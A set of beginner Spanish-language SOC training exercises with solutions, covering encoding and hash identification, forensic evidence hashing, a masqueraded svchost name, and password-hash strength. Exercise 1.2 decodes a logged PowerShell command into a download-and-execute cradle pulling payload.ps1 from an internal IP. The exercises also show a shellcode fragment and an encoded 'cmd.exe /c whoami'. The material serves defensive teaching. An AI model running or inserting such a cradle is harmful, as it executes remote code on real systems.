# 🟢 Nivel 1 — Fácil

Ejercicios de identificación y decodificación. No requieren código.
Herramienta recomendada: [CyberChef](https://gchq.github.io/CyberChef/)

---

## Ejercicio 1.1 — ¿Qué tipo de dato es este?

Clasificá cada uno como: `Base64`, `Hex`, `Hash MD5`, `Hash SHA-256`, `Texto plano`, `URL encoded`

```
A) SGVsbG8gU09DIQAAAA==
B) d41d8cd98f00b204e9800998ecf8427e
C) e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
D) 48656c6c6f20534f4321
E) cmd.exe%20%2Fc%20whoami
F) Hola analista, esto es texto normal
G) cG93ZXJzaGVsbA==
H) 4831c04831ff4831f64831d2
```

<details>
<summary>💡 Pistas</summary>

- Base64: solo A-Za-z0-9+/=, longitud múltiplo de 4, puede terminar en =
- Hex: solo 0-9 A-F, longitud par
- MD5: 32 chars hex
- SHA-256: 64 chars hex
- URL encoding: tiene %XX donde XX es hex

</details>

<details>
<summary>✅ Solución</summary>

```
A) Base64        (termina en ==, chars válidos)
B) Hash MD5      (32 chars hex)
C) Hash SHA-256  (64 chars hex)
D) Hex           (solo 0-9 a-f, longitud par = 20 chars = 10 bytes)
E) URL encoded   (%20 = espacio, %2F = /)
F) Texto plano   (legible directamente)
G) Base64        (termina en ==) → decodifica a "powershell"
H) Hex           (shellcode x86-64: xor rax, rax; xor rdi, rdi...)
```

</details>

---

## Ejercicio 1.2 — Decodificá este alert de PowerShell

Durante una investigación encontrás este comando en los logs de Sysmon (Event ID 1):

```
Process: powershell.exe
CommandLine: powershell -NoProfile -NonInteractive -enc 
  aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
```

**Preguntas:**
1. ¿Qué codificación usa el parámetro `-enc`?
2. Decodificá el payload
3. ¿Qué hace exactamente?
4. ¿Qué IOC encontrás en el payload decodificado?

<details>
<summary>💡 Pistas</summary>

- PowerShell `-enc` usa Base64 con encoding UTF-16LE (no UTF-8)
- En CyberChef: "From Base64" → "Decode text" con UTF-16LE
- En Python: `base64.b64decode(s).decode('utf-16-le')`

</details>

<details>
<summary>✅ Solución</summary>

**1.** Base64 (UTF-16LE — encoding de PowerShell)

**2.** Payload decodificado:
```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')
```

**3.** El comando:
- `iex` = Invoke-Expression (ejecuta el string como código PowerShell)
- `New-Object Net.WebClient` = crea cliente HTTP
- `.DownloadString(...)` = descarga contenido de URL como string
- Resultado: descarga y ejecuta código PowerShell desde `192.168.1.100`

**4.** IOC: IP `192.168.1.100` (C2 interno o red pivote), ruta `/payload.ps1`

**Severidad:** ALTA — ejecución remota de código, técnica LOLBin (PowerShell)
**MITRE:** T1059.001 (PowerShell), T1105 (Ingress Tool Transfer)

</details>

---

## Ejercicio 1.3 — Hash de evidencia

Sos el analista forense. Recibís una imagen de disco con este hash:
```
SHA-256: 3ba4c89ddf79a716dad00e3a7a3e0620b0b8f8e96c7e0da8f57e0c7e0a4a8d2f
```

Después de trabajar con la imagen, recalculás el hash y obtenés:
```
SHA-256: 3ba4c89ddf79a716dad00e3a7a3e0620b0b8f8e96c7e0da8f57e0c7e0a4a8d2f
```

**Preguntas:**
1. ¿La evidencia fue modificada?
2. ¿Podés usarla en un proceso legal?
3. ¿Qué hubiese pasado si el segundo hash fuera diferente?

<details>
<summary>✅ Solución</summary>

1. **No fue modificada** — los hashes son idénticos
2. **Sí** — la cadena de custodia está intacta, la evidencia es válida
3. Si el hash fuera diferente:
   - La evidencia fue **modificada** (intencional o accidentalmente)
   - **No puede usarse** en juicio — pierde valor forense
   - Habría que usar la copia original y reiniciar el proceso
   - Reportar el incidente de cadena de custodia

**Lección:** Siempre hashear ANTES de tocar. Siempre trabajar con copias.

</details>

---

## Ejercicio 1.4 — Buscá el IOC en VirusTotal

Encontrás el siguiente archivo sospechoso en un endpoint:

```
Nombre: svchost32.exe
MD5:    b94f53e97e0f4c2f3f6e2c7d8a9b0c1d
SHA-256: 0000000000000000000000000000000000000000000000000000000000000000
```

**Preguntas:**
1. ¿Qué te llama la atención del nombre del archivo?
2. ¿Qué hash usarías para buscar en VirusTotal y por qué?
3. El SHA-256 todo en ceros, ¿qué indica?

<details>
<summary>✅ Solución</summary>

1. `svchost32.exe` — el legítimo es `svchost.exe` (sin "32"). Técnica común: nombres similares para pasar desapercibidos (masquerading — T1036).

2. Usaría **SHA-256** para buscar en VT:
   - MD5 tiene colisiones conocidas — dos archivos distintos pueden tener el mismo MD5
   - SHA-256 es prácticamente único por archivo
   - VT acepta ambos, pero SHA-256 es más confiable

3. Un SHA-256 todo en ceros es imposible en la práctica. Puede indicar:
   - El recolector de datos tuvo un error al calcular el hash
   - El archivo estaba vacío (SHA-256 de un archivo vacío es `e3b0c...`, no todo zeros)
   - El log fue manipulado

</details>

---

## Ejercicio 1.5 — Identifica el algoritmo de hash

Un atacante comprometió una base de datos de usuarios. Encontrás estas contraseñas hasheadas:

```
usuario1: 5f4dcc3b5aa765d61d8327deb882cf99
usuario2: $2b$10$N9qo8uLOick6U5W3gRKQUubd5.F/H2KAf7g7V
usuario3: e10adc3949ba59abbe56e057f20f883e
usuario4: $argon2id$v=19$m=65536,t=3,p=4$...
usuario5: 356a192b7913b04c54574d18c28d46e6395428ab
```

**Preguntas:**
1. Identificá el algoritmo de cada hash
2. ¿Cuáles están en riesgo inmediato de ser crackeados?
3. ¿Cuáles son seguros con la tecnología actual?

<details>
<summary>✅ Solución</summary>

```
usuario1: MD5       (32 chars) → "password" — RIESGO CRÍTICO (rainbow tables)
usuario2: bcrypt    ($2b$ prefix, factor 10) → seguro, lento por diseño
usuario3: MD5       → "123456" — RIESGO CRÍTICO
usuario4: Argon2id  → muy seguro, ganador PHC 2015
usuario5: SHA-1     (40 chars) → "1" — RIESGO ALTO (debería ser bcrypt/Argon2)
```

**Riesgo inmediato:** usuario1 y usuario3 (MD5 sin sal, passwords comunes)
**Riesgo alto:** usuario5 (SHA-1 — rápido, puede crackearse)
**Seguros:** usuario2 (bcrypt) y usuario4 (Argon2id)

**Acción:** Notificar a todos los usuarios afectados. Forzar reset de contraseñas para usuario1, usuario3, usuario5. Implementar bcrypt/Argon2 para toda la base.

</details>

---

*Continuá con: [nivel_2_medio.md](./nivel_2_medio.md)*
